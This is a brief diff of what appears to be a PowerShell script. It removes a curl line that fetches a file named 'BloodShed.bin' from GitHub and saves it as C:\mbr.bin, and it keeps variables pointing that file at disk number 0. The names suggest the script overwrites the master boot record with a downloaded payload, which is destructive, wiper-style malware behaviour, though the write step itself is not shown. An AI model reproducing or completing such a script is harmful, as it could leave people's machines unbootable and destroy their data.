@@ -1,4 +1,3 @@
-curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\mbr.bin
 $BinPath     = "C:\mbr.bin"
 $DiskNumber  = 0
 
